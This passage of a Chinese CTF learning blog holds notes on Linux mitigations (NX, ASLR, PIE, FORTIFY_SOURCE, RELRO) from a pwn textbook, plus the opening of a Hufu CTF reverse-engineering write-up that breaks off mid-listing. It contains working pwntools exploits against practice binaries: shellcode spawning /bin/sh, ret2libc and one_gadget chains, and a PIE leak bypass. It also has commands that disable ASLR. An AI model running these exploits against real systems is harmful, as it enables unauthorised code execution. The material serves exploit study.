esp</span><br><span class="line">   0xf7f65439:add    DWORD PTR [ecx],0x0</span><br><span class="line">   0xf7f6543c:mov    al,0x18</span><br><span class="line">   0xf7f6543e:out    dx,eax</span><br><span class="line">   0xf7f6543f:(bad)  </span><br><span class="line">   0xf7f65440:cld    </span><br><span class="line">   0xf7f65441:<span class="built_in">test</span>   BYTE PTR [ecx],al</span><br><span class="line">   0xf7f65443:add    BYTE PTR [eax-0x4b0010d8],dh</span><br><span class="line">   0xf7f65449:<span class="built_in">test</span>   DWORD PTR [ecx],eax</span><br><span class="line">   0xf7f6544b:add    BYTE PTR [eax+0x29],ah</span><br><span class="line">gef➤  quit</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">ret = <span class="number">0xf7f65437</span><span class="comment"># jmp esp</span></span><br><span class="line">shellcode = <span class="string">b&quot;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">payload = <span class="number">140</span> * <span class="string">b&#x27;\x00&#x27;</span> + p32(ret) + shellcode</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">io = process(<span class="string">&quot;a.out&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="开启NX情况"><a href="#开启NX情况" class="headerlink" title="开启NX情况"></a>开启NX情况</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -fno-stack-protector -no-pie -z noexecstack main.c </span><br></pre></td></tr></table></figure><p>开启NX后，之前的EXP就不好使了，此时我们自己注入的，放在栈上的shellcode就不可以执行了，但是我们可以用程序已有的代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gef➤  p system</span><br><span class="line"><span class="variable">$1</span> = &#123;&lt;text variable, no debug info&gt;&#125; 0xf7e193d0 &lt;system&gt;</span><br><span class="line">gef➤  search-pattern <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">[+] Searching <span class="string">&#x27;/bin/sh&#x27;</span> <span class="keyword">in</span> memory</span><br><span class="line">[+] In <span class="string">&#x27;/lib/i386-linux-gnu/libc-2.27.so&#x27;</span>(0xf7ddc000-0xf7fb1000), permission=r-x</span><br><span class="line">  0xf7f5a1db - 0xf7f5a1e2  →   <span class="string">&quot;/bin/sh&quot;</span> </span><br></pre></td></tr></table></figure><p>因为前面都关了ASLR，所以地址每次加载都不会变，直接执行system(“bin/sh”)即可</p><h2 id="ASLR和PIE"><a href="#ASLR和PIE" class="headerlink" title="ASLR和PIE"></a>ASLR和PIE</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">stack</span>;</span><br><span class="line">    <span class="keyword">int</span> * heap = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">    <span class="keyword">void</span> * handle = dlopen(<span class="string">&quot;libc.so.6&quot;</span>, RTLD_NOW | RTLD_GLOBAL);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;executable: %p\n&quot;</span>, &amp;main);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;system@plt: %p\n&quot;</span>, &amp;system);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;heap: %p\n&quot;</span>, heap);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;stack: %p\n&quot;</span>, &amp;<span class="built_in">stack</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;libc: %p\n&quot;</span>, handle);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">free</span>(heap);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="关闭ASLR"><a href="#关闭ASLR" class="headerlink" title="关闭ASLR"></a>关闭ASLR</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">gcc aslr.c -no-pie -fno-pie -ldl</span><br></pre></td></tr></table></figure><img src="/2022/03/22/%E7%AC%AC4%E7%AB%A0_Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20220318155336733.png" class="" title="image-20220318155336733"><p>可以发现，在关闭ASLR的时候，可以发现，除了stack有轻微的差距外，其他没有任何区别，每次执行都一样</p><h3 id="部分开启ASLR"><a href="#部分开启ASLR" class="headerlink" title="部分开启ASLR"></a>部分开启ASLR</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><img src="/2022/03/22/%E7%AC%AC4%E7%AB%A0_Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20220318155851127.png" class="" title="image-20220318155851127"><p>可以发现stack和libc的地址有显著变化，其他的不会变</p><h3 id="完全开启ASLR"><a href="#完全开启ASLR" class="headerlink" title="完全开启ASLR"></a>完全开启ASLR</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 2 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><img src="/2022/03/22/%E7%AC%AC4%E7%AB%A0_Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20220318160116452.png" class="" title="image-20220318160116452"><p>可以发现stack和libc的地址和heap有显著变化，其他的不会变</p><h3 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h3><p>ASLR是一种操作系统层面的技术，二进制程序本身是不支持随机化加载的，人们在2003年引入了位置无关可执行文件（Position-Independent Executable, PIE）.，他是在应用层的编译器上实现的，通过将程序编译为位置无关代码（Position-Independent Code, PIC）,使程序可以被加载到任意位置，就像是一个特殊的共享库，但PIR也会在一定程度上影响性能，因此在大多数操作系统上PIE仅用于一些对安全性要求比较高的程序。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -pie -fpie aslr.c -ldl</span><br></pre></td></tr></table></figure><img src="/2022/03/22/%E7%AC%AC4%E7%AB%A0_Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20220318161321229.png" class="" title="image-20220318161321229"><p>可以发现所有地址全部随机（指起始位置，该对象内部依然是原来的结构，相对偏移是不会变的）</p><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>代码仍然为NX的那个例子</p><h4 id="开启NX-ASLR-关闭PIE"><a href="#开启NX-ASLR-关闭PIE" class="headerlink" title="开启NX, ASLR, 关闭PIE"></a>开启NX, ASLR, 关闭PIE</h4><p>exp为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./nopie.out&quot;</span>)</span><br><span class="line"></span><br><span class="line">nopie = ELF(<span class="string">&quot;./nopie.out&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vlun_func = <span class="number">0x08048456</span></span><br><span class="line">payload1 = <span class="string">b&quot;A&quot;</span> * <span class="number">140</span> + p32(nopie.plt[<span class="string">&#x27;write&#x27;</span>]) + p32(vlun_func) + p32(<span class="number">1</span>) + p32(nopie.got[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line">io.send(payload1)</span><br><span class="line"></span><br><span class="line">libc_addr = u32(io.recv(<span class="number">4</span>)) - libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># system_addr = libc.symbols[&#x27;system&#x27;] + libc_addr</span></span><br><span class="line"><span class="comment"># binsh_addr = 0x17E1DB + libc_addr</span></span><br><span class="line"><span class="comment"># payload2 = b&quot;A&quot; * 140 + p32(system_addr)+p32(0) + p32(binsh_addr)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io.send(payload2)</span></span><br><span class="line"><span class="comment"># io.interactive()</span></span><br><span class="line"></span><br><span class="line">pop_ebx = <span class="number">0x080482e9</span></span><br><span class="line">one_gadget = <span class="number">0x137eef</span> + libc_addr</span><br><span class="line">libc_got_addr = <span class="number">0x01D8000</span> + libc_addr</span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">140</span> + p32(pop_ebx) + p32(libc_got_addr)</span><br><span class="line">payload2 += p32(one_gadget) + p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">io.send(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="开启NX-ASLR-PIE"><a href="#开启NX-ASLR-PIE" class="headerlink" title="开启NX, ASLR, PIE"></a>开启NX, ASLR, PIE</h4><p>这里修改下源代码测试，使其泄露出main函数地址,以便知道文件加载基地址</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln_func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    <span class="built_in">read</span>(STDIN_FILENO, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;executable: %p\n&quot;</span>, &amp;main);</span><br><span class="line">    <span class="built_in">vuln_func</span>();</span><br><span class="line">    <span class="built_in">write</span>(STDOUT_FILENO, <span class="string">&quot;Hello world!\n&quot;</span>, <span class="number">13</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pie_fpie = ELF(<span class="string">&quot;./pie_fpie.out&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./pie_fpie.out&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;executable: &quot;</span>)</span><br><span class="line">main_addr_hex = io.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>].decode()</span><br><span class="line">main_addr_hex = <span class="built_in">int</span>(main_addr_hex, <span class="number">16</span>)</span><br><span class="line">pie_fpie_baseaddr = main_addr_hex - pie_fpie.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">vuln_addr_offset = <span class="number">0x57D</span></span><br><span class="line">got_offset = <span class="number">0x1FD0</span> + pie_fpie_baseaddr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&quot;A&quot;</span> * <span class="number">132</span> +p32(got_offset) +<span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span> +  p32(pie_fpie.plt[<span class="string">&#x27;write&#x27;</span>] + pie_fpie_baseaddr) + p32(vuln_addr_offset + pie_fpie_baseaddr)+ p32(<span class="number">1</span>) + p32(pie_fpie.got[<span class="string">&#x27;write&#x27;</span>] + pie_fpie_baseaddr)</span><br><span class="line">io.send(payload1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">libc_addr = write_addr - libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line">binshaddr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">system_addr = libc_addr + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">140</span> + p32(system_addr) + p32(<span class="number">0</span>) + p32(binshaddr)</span><br><span class="line">io.send(payload2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="FORTIFY-SOURCE"><a href="#FORTIFY-SOURCE" class="headerlink" title="FORTIFY SOURCE"></a>FORTIFY SOURCE</h2><p>这是一种针对危险函数的检查机制，在编译时尝试去确定风险是否存在，或者将危险函数替换为相对安全的函数实现，以大大降低缓冲区溢出发生的风险</p><ul><li>-D_FORTIFY_SOURCE=1时，开启缓冲区溢出攻击检查</li><li>-D_FORTIFY_SOURCE=2时，开启缓冲区溢出以及格式化字符串攻击检查</li></ul><p>用以下代码测试</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf1[<span class="number">10</span>], buf2[<span class="number">10</span>], *s;</span><br><span class="line">    <span class="keyword">int</span> num;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(buf1, argv[<span class="number">1</span>], <span class="number">10</span>);              <span class="comment">//safe</span></span><br><span class="line">    <span class="built_in">strcpy</span>(buf2, <span class="string">&quot;AAAABBBBC&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s %s\n&quot;</span>, buf1, buf2);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(buf1, argv[<span class="number">2</span>], <span class="built_in">atoi</span>(argv[<span class="number">3</span>]));   <span class="comment">//unknown</span></span><br><span class="line">    <span class="built_in">strcpy</span>(buf2, argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s %s\n&quot;</span>, buf1, buf2);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(buf1, argv[<span class="number">1</span>], <span class="number">11</span>);              <span class="comment">//unsafe</span></span><br><span class="line">    <span class="built_in">strcpy</span>(buf2, <span class="string">&quot;AAAABBBBCC&quot;</span>);</span><br><span class="line"></span><br><span class="line">    s = <span class="built_in">fgets</span>(buf1, <span class="number">11</span>, stdin);             <span class="comment">//fmt unknown</span></span><br><span class="line">    <span class="built_in">printf</span>(buf1, &amp;num);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="编译时的安全检查"><a href="#编译时的安全检查" class="headerlink" title="编译时的安全检查"></a>编译时的安全检查</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -g -fno-stack-protector -O1 -D_FORTIFY_SOURCE=2 main.c -o fortify_chk</span><br></pre></td></tr></table></figure><img src="/2022/03/22/%E7%AC%AC4%E7%AB%A0_Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20220321214409197.png" class="" title="image-20220321214409197"><h3 id="运行时的安全检查"><a href="#运行时的安全检查" class="headerlink" title="运行时的安全检查"></a>运行时的安全检查</h3><p>将unsafe的部分注释掉，重新编译</p><h4 id="D-FORTIFY-SOURCE-0"><a href="#D-FORTIFY-SOURCE-0" class="headerlink" title="D_FORTIFY_SOURCE=0"></a>D_FORTIFY_SOURCE=0</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -g -fno-stack-protector -O1 -D_FORTIFY_SOURCE=0 main.c -o fortify0</span><br></pre></td></tr></table></figure><img src="/2022/03/22/%E7%AC%AC4%E7%AB%A0_Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20220321215313995.png" class="" title="image-20220321215313995"><p>这个地方输入的argv[1] 可以导致buf2溢出，但是程序仍然可以正常运行</p><h4 id="D-FORTIFY-SOURCE-1"><a href="#D-FORTIFY-SOURCE-1" class="headerlink" title="D_FORTIFY_SOURCE=1"></a>D_FORTIFY_SOURCE=1</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -g -fno-stack-protector -O1 -D_FORTIFY_SOURCE=1 main.c -o fortify1</span><br></pre></td></tr></table></figure><img src="/2022/03/22/%E7%AC%AC4%E7%AB%A0_Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20220321215438356.png" class="" title="image-20220321215438356"><img src="/2022/03/22/%E7%AC%AC4%E7%AB%A0_Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20220321215536499.png" class="" title="image-20220321215536499"><p>unknown部分被检测了出来，但是fmt unknown（%n, %5%x等）没有检测出来</p><h4 id="D-FORTIFY-SOURCE-2"><a href="#D-FORTIFY-SOURCE-2" class="headerlink" title="D_FORTIFY_SOURCE=2"></a>D_FORTIFY_SOURCE=2</h4><img src="/2022/03/22/%E7%AC%AC4%E7%AB%A0_Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20220321215756979.png" class="" title="image-20220321215756979"><p>格式化字符串漏洞这里也被检测出来了</p><h2 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h2><p>RELRO(Relocation Read-Only)机制的提出就是为了解决延迟绑定的安全问题，它将符号重定向表设置为只读，或者再程序启动时就解析并绑定所有动态符号，从而避免GOT上的地址被篡改。</p><p>测试代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> * p = (<span class="keyword">size_t</span> *)strtol(argv[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">16</span>);</span><br><span class="line">    p[<span class="number">0</span>] = <span class="number">0x41414141</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;RELRO: %x\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)*p);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将参数的地址改为.got 或 .got.plt等做测试</p><h3 id="NO-RELRO"><a href="#NO-RELRO" class="headerlink" title="NO RELRO"></a>NO RELRO</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gcc -z norelro -no-pie -fno-pie main.c -o relro_norelro</span><br><span class="line">readelf -S relro_norelro </span><br><span class="line">.....</span><br><span class="line">  [21] .got              PROGBITS         0000000000600910  00000910</span><br><span class="line">       0000000000000010  0000000000000008  WA       0     0     8</span><br><span class="line">  [22] .got.plt          PROGBITS         0000000000600920  00000920</span><br><span class="line">       0000000000000028  0000000000000008  WA       0     0     8</span><br><span class="line">......</span><br></pre></td></tr></table></figure><img src="/2022/03/22/%E7%AC%AC4%E7%AB%A0_Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20220322200006012.png" class="" title="image-20220322200006012"><p>测试程序，发现.got和.got.plt都是可写的</p><h3 id="Partial-RELRO"><a href="#Partial-RELRO" class="headerlink" title="Partial RELRO"></a>Partial RELRO</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gcc -z lazy  -no-pie -fno-pie main.c -o relro_lazy</span><br><span class="line">readelf -S relro_lazy</span><br><span class="line">.....</span><br><span class="line">  [21] .got              PROGBITS         0000000000600ff0  00000ff0</span><br><span class="line">       0000000000000010  0000000000000008  WA       0     0     8</span><br><span class="line">  [22] .got.plt          PROGBITS         0000000000601000  00001000</span><br><span class="line">       0000000000000028  0000000000000008  WA       0     0     8</span><br><span class="line">.....</span><br></pre></td></tr></table></figure><img src="/2022/03/22/%E7%AC%AC4%E7%AB%A0_Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20220322200850406.png" class="" title="image-20220322200850406"><h3 id="Full-RELRO"><a href="#Full-RELRO" class="headerlink" title="Full RELRO"></a>Full RELRO</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gcc -z now  -no-pie -fno-pie main.c -o relro_now </span><br><span class="line">readelf -S relro_now</span><br><span class="line">.....</span><br><span class="line">  [21] .got              PROGBITS         0000000000600fc8  00000fc8</span><br><span class="line">       0000000000000038  0000000000000008  WA       0     0     8</span><br><span class="line">.....</span><br></pre></td></tr></table></figure><p>在程序编译时开启Full RELRO ， .got.plt段就不需要了，在这种情况下，延迟绑定将被禁止。link_map和_dll_runtime_resolve的地址也不会被装入。开启Full RELRO会对程序启动时的性能造成一定的影响，但只有这样才能防止攻击者篡改GOT表</p>]]></content>
      
      
      <categories>
          
          <category> pwn学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 读书笔记 </tag>
            
            <tag> 《CTF竞赛权威指南-pwn篇》 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022_虎符CTF_部分RE_WP</title>
      <link href="/2022/03/21/2022%E8%99%8E%E7%AC%A6CTF_%E9%83%A8%E5%88%86RE_WP/"/>
      <url>/2022/03/21/2022%E8%99%8E%E7%AC%A6CTF_%E9%83%A8%E5%88%86RE_WP/</url>
      
        <content type="html"><![CDATA[<h2 id="fpbe"><a href="#fpbe" class="headerlink" title="fpbe"></a>fpbe</h2><p>根据知乎这篇文章 <a href="https://zhuanlan.zhihu.com/p/467647354">https://zhuanlan.zhihu.com/p/467647354</a><br>作者在编写程序中 有用到fpbe.bpf.c这个源文件，而在这个文件中用到了BPF_KPROBE(uprobe)，这个函数就是在那个fpbe程序中的uprobed_function之前执行，但是BPF_KPROBE(uprobe) 是ebpf字节码形式的，IDA看不到，所以先binwalk提取出用ebpf字节码的那部分来，然后用llvm-objdump -d xxx.o 提取,就可以看到验证的函数了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span 